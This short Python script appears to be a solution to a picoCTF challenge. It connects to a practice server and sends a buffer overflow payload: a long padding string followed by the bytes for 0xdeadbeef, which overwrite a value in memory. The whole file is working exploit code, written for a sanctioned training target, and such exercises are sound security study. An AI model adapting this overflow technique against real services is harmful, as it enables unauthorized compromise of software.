import socket
from time import sleep

HOST = "mars.picoctf.net"
PORT = 31890

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    data1 = s.recv(1024 * 10)
    print(data1)
    sleep(1)
    s.sendall(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde\n\n")
    data2 = s.recv(1024 * 10)
    print(data2)
    sleep(1)
    data3 = s.recv(1024 * 10)
    print(data3)